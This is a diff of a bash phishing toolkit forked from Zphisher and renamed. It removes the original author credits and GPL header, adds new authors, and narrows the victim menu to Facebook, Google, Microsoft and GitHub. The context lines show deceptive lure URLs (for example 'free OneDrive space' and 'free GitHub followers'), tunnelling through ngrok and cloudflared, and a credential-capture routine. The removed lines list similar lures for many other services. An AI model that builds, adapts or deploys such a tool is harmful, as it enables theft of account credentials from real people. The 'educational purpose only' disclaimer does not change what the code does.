@@ -1,98 +1,3 @@
-#!/bin/bash
-
-##   Zphisher 	: 	Automated Phishing Tool
-##   Author 	: 	TAHMID RAYAT 
-##   Version 	: 	2.2
-##   Github 	: 	https://github.com/htr-tech
-
-##   THANKS TO :
-##   Aditya Shakya - https://github.com/adi1090x
-##   1RaY-1 - https://github.com/1RaY-1
-##   Moises Tapia - https://github.com/MoisesTapia
-##   TheLinuxChoice - https://twitter.com/linux_choice
-##   DarksecDevelopers  - https://github.com/DarksecDevelopers
-##   Ignitetch  - https://github.com/Ignitetch/AdvPhishing
-##   Võ Ngọc Bảo - https://github.com/vongocbao
-##   Mustakim Ahmed - https://www.facebook.com/Learn.Termux.009
-
-
-## If you Copy Then Give the credits :)
-
-
-
-##                   GNU GENERAL PUBLIC LICENSE
-##                    Version 3, 29 June 2007
-##
-##    Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
-##    Everyone is permitted to copy and distribute verbatim copies
-##    of this license document, but changing it is not allowed.
-##
-##                         Preamble
-##
-##    The GNU General Public License is a free, copyleft license for
-##    software and other kinds of works.
-##
-##    The licenses for most software and other practical works are designed
-##    to take away your freedom to share and change the works.  By contrast,
-##    the GNU General Public License is intended to guarantee your freedom to
-##    share and change all versions of a program--to make sure it remains free
-##    software for all its users.  We, the Free Software Foundation, use the
-##    GNU General Public License for most of our software; it applies also to
-##    any other work released this way by its authors.  You can apply it to
-##    your programs, too.
-##
-##    When we speak of free software, we are referring to freedom, not
-##    price.  Our General Public Licenses are designed to make sure that you
-##    have the freedom to distribute copies of free software (and charge for
-##    them if you wish), that you receive source code or can get it if you
-##    want it, that you can change the software or use pieces of it in new
-##    free programs, and that you know you can do these things.
-##
-##    To protect your rights, we need to prevent others from denying you
-##    these rights or asking you to surrender the rights.  Therefore, you have
-##    certain responsibilities if you distribute copies of the software, or if
-##    you modify it: responsibilities to respect the freedom of others.
-##
-##    For example, if you distribute copies of such a program, whether
-##    gratis or for a fee, you must pass on to the recipients the same
-##    freedoms that you received.  You must make sure that they, too, receive
-##    or can get the source code.  And you must show them these terms so they
-##    know their rights.
-##
-##    Developers that use the GNU GPL protect your rights with two steps:
-##    (1) assert copyright on the software, and (2) offer you this License
-##    giving you legal permission to copy, distribute and/or modify it.
-##
-##    For the developers' and authors' protection, the GPL clearly explains
-##    that there is no warranty for this free software.  For both users' and
-##    authors' sake, the GPL requires that modified versions be marked as
-##    changed, so that their problems will not be attributed erroneously to
-##    authors of previous versions.
-##
-##    Some devices are designed to deny users access to install or run
-##    modified versions of the software inside them, although the manufacturer
-##    can do so.  This is fundamentally incompatible with the aim of
-##    protecting users' freedom to change the software.  The systematic
-##    pattern of such abuse occurs in the area of products for individuals to
-##    use, which is precisely where it is most unacceptable.  Therefore, we
-##    have designed this version of the GPL to prohibit the practice for those
-##    products.  If such problems arise substantially in other domains, we
-##    stand ready to extend this provision to those domains in future versions
-##    of the GPL, as needed to protect the freedom of users.
-##
-##    Finally, every program is threatened constantly by software patents.
-##    States should not allow patents to restrict development and use of
-##    software on general-purpose computers, but in those that do, we wish to
-##    avoid the special danger that patents applied to a free program could
-##    make it effectively proprietary.  To prevent this, the GPL assures that
-##    patents cannot be used to render the program non-free.
-##
-##    The precise terms and conditions for copying, distribution and
-##    modification follow.
-##
-##      Copyright (C) 2021  HTR-TECH (https://github.com/htr-tech)
-##
-
 
 ## ANSI colors (FG & BG)
 RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
@@ -151,7 +56,7 @@ kill_pid() {
 
 ## Banner
 banner() {
-	cat <<-EOF
+	cat <<- EOF
 		${ORANGE}
 		${ORANGE} ___ _  __    _    _   _   ____ ___ _     ___ ____  
 		${ORANGE}|_ _| |/ /   / \  | \ | | | __ )_ _| |   |_ _/ ___| 
@@ -160,7 +65,7 @@ banner() {
 		${ORANGE}|___|_|\_\/_/   \_\_| \_| |____/___|_____|___|____/ 
 		${ORANGE}                                   
 
-		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Chai Ruo Xi, Chin Xu Sheng, Lim Shin Chyi)${WHITE}
+		${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Chai Ruo Xi, Chin Xu Sheng, Lim Shin Chyi ${WHITE}
 	EOF
 }
 
@@ -303,14 +208,9 @@ msg_exit() {
 about() {
 	{ clear; banner; echo; }
 	cat <<- EOF
-		${GREEN}Author   ${RED}:  ${ORANGE}TAHMID RAYAT ${RED}[ ${ORANGE}HTR-TECH ${RED}]
-		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/htr-tech
-		${GREEN}Social   ${RED}:  ${CYAN}https://linktr.ee/tahmid.rayat
-		${GREEN}Version  ${RED}:  ${ORANGE}2.2
-
-		${REDBG}${WHITE} Thanks : Adi1090x,MoisesTapia,ThelinuxChoice
-								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}
-
+		${GREEN}Author   ${RED}:  ${ORANGE}Chai Ruo Xi, Chin Xu Sheng, Lim Shin Chyi ${RED}[ ${ORANGE}HTR-TECH ${RED}]
+		${GREEN}Github   ${RED}:  ${CYAN}https://github.com/XtraS001/Ikan-Bilis
+		
 		${RED}Warning:${WHITE}
 		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
 		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}
@@ -404,9 +304,6 @@ start_ngrok() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
-
-
-## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
 
 ## Start Cloudflared
 start_cloudflared() { 
@@ -599,17 +496,10 @@ main_menu() {
 	cat <<- EOF
 		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
+		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      	
+		${RED}[${WHITE}02${RED}]${ORANGE} Google        
+		${RED}[${WHITE}03${RED}]${ORANGE} Microsoft     
+		${RED}[${WHITE}04${RED}]${ORANGE} Github
 
 		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
 
@@ -621,124 +511,12 @@ main_menu() {
 		1 | 01)
 			site_facebook;;
 		2 | 02)
-			site_instagram;;
-		3 | 03)
 			site_gmail;;
-		4 | 04)
+		3 | 03)
 			website="microsoft"
 			mask='http://unlimited-onedrive-space-for-free'
 			tunnel_menu;;
-		5 | 05)
-			website="netflix"
-			mask='http://upgrade-your-netflix-plan-free'
-			tunnel_menu;;
-		6 | 06)
-			website="paypal"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		7 | 07)
-			website="steam"
-			mask='http://steam-500-usd-gift-card-free'
-			tunnel_menu;;
-		8 | 08)
-			website="twitter"
-			mask='http://get-blue-badge-on-twitter-free'
-			tunnel_menu;;
-		9 | 09)
-			website="playstation"
-			mask='http://playstation-500-usd-gift-card-free'
-			tunnel_menu;;
-		10)
-			website="tiktok"
-			mask='http://tiktok-free-liker'
-			tunnel_menu;;
-		11)
-			website="twitch"
-			mask='http://unlimited-twitch-tv-user-for-free'
-			tunnel_menu;;
-		12)
-			website="pinterest"
-			mask='http://get-a-premium-plan-for-pinterest-free'
-			tunnel_menu;;
-		13)
-			website="snapchat"
-			mask='http://view-locked-snapchat-accounts-secretly'
-			tunnel_menu;;
-		14)
-			website="linkedin"
-			mask='http://get-a-premium-plan-for-linkedin-free'
-			tunnel_menu;;
-		15)
-			website="ebay"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		16)
-			website="quora"
-			mask='http://quora-premium-for-free'
-			tunnel_menu;;
-		17)
-			website="protonmail"
-			mask='http://protonmail-pro-basics-for-free'
-			tunnel_menu;;
-		18)
-			website="spotify"
-			mask='http://convert-your-account-to-spotify-premium'
-			tunnel_menu;;
-		19)
-			website="reddit"
-			mask='http://reddit-official-verified-member-badge'
-			tunnel_menu;;
-		20)
-			website="adobe"
-			mask='http://get-adobe-lifetime-pro-membership-free'
-			tunnel_menu;;
-		21)
-			website="deviantart"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		22)
-			website="badoo"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		23)
-			website="origin"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		24)
-			website="dropbox"
-			mask='http://get-1TB-cloud-storage-free'
-			tunnel_menu;;
-		25)
-			website="yahoo"
-			mask='http://grab-mail-from-anyother-yahoo-account-free'
-			tunnel_menu;;
-		26)
-			website="wordpress"
-			mask='http://unlimited-wordpress-traffic-free'
-			tunnel_menu;;
-		27)
-			website="yandex"
-			mask='http://grab-mail-from-anyother-yandex-account-free'
-			tunnel_menu;;
-		28)
-			website="stackoverflow"
-			mask='http://get-stackoverflow-lifetime-pro-membership-free'
-			tunnel_menu;;
-		29)
-			site_vk;;
-		30)
-			website="xbox"
-			mask='http://get-500-usd-free-to-your-acount'
-			tunnel_menu;;
-		31)
-			website="mediafire"
-			mask='http://get-1TB-on-mediafire-free'
-			tunnel_menu;;
-		32)
-			website="gitlab"
-			mask='http://get-1k-followers-on-gitlab-free'
-			tunnel_menu;;
-		33)
+		4 | 04)
 			website="github"
 			mask='http://get-1k-followers-on-github-free'
 			tunnel_menu;;
